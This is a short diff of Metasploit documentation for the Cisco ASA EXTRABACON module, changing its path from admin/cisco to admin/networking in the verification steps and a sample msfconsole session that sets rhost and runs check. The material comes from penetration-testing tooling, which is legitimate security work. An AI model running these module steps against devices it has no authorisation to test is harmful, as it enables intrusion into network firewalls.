@@ -59,7 +59,7 @@ All of the leaked versions are available in the module
 ## Verification Steps
 
 - Start `msfconsole`
-- `use auxiliary/admin/cisco/cisco_asa_extrabacon`
+- `use auxiliary/admin/networking/cisco_asa_extrabacon`
 - `set RHOST x.x.x.x`
 - `check`
 - `run`
@@ -71,7 +71,7 @@ All of the leaked versions are available in the module
 ## Checking for a vulnerable version
 
 ```
-msf > use auxiliary/admin/cisco/cisco_asa_extrabacon
+msf > use auxiliary/admin/networking/cisco_asa_extrabacon
 msf auxiliary(cisco_asa_extrabacon) > set rhost 192.168.1.1
 rhost => 192.168.1.1
 msf auxiliary(cisco_asa_extrabacon) > check
